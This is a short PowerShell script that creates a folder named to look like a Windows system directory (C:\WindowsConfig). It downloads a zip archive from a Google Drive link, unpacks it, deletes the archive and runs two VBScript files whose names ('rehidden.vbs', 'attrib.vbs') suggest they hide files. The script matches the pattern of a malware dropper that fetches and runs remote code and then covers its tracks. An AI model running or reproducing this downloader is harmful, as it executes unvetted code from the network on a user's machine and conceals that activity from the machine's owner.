cd C:\
mkdir WindowsConfig
cd WindowsConfig
Invoke-WebRequest -Uri 'https://drive.google.com/u/0/uc?id=18L1r6uOirWGVFB39vThRWrIWKwZAl57j&export=download' -OutFile dist.zip
Expand-Archive .\dist.zip -DestinationPath dist
rm dist.zip
cd dist
start-process rehidden.vbs
start-process attrib.vbs
